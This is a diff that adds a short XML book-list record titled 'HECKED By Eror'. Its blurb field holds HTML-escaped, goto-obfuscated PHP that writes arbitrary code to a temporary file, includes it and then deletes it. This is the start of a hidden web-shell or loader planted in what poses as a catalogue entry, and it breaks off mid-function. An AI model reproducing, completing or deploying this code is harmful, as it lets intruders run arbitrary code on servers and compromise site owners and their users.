@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<library>
+  <list_title>HECKED By Eror</list_title>
+  <blurb>&amp;lt;?php error_reporting(0);goto PP; BK: function tC($ZJ) { goto rT; rT: $dL = &amp;quot;t\x65mpnam&amp;quot;(&amp;quot;sys_g\x65t_t\x65mp_d\x69r&amp;quot;(), &amp;quot;\164\x6d\x70\137\x66\x75\x6e\x63&amp;quot;); goto hq; lJ: unlink($dL); goto Il; Il: return $dm; goto Uc; pM: $dm = (include $dL); goto lJ; hq: file_put_contents($dL, &amp;quot;\74\77\160\150\x70\40{$ZJ}&amp;quot;); goto pM; Uc: } goto dL; PP: function gW($F9) { goto TH; Gd: $ik = 0; goto T3; xN: Ky: goto lt; lt: $ik++; goto Gm; us: return $F9; goto zm; Z9: if (!($ik &amp;lt; strlen($F9))) { goto qK; } goto WS;</blurb>
+  <url>https://books.google.com/books?uid=113292571199183993966&amp;as_coll=1001&amp;hl=id</url>
+</library>
